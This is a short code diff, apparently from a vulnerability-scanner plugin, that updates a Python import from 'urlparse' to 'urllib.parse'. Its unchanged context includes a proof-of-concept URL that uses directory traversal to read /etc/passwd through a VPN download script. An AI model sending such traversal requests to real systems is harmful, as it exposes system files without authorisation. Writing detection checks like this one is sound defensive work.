@@ -14,7 +14,7 @@ POC:
     3. http://foobar/acc/vpn/download.php?f=../../../../../../etc/passwd
 '''
 
-import urlparse
+import urllib.parse
 
 
 def assign(service, arg):
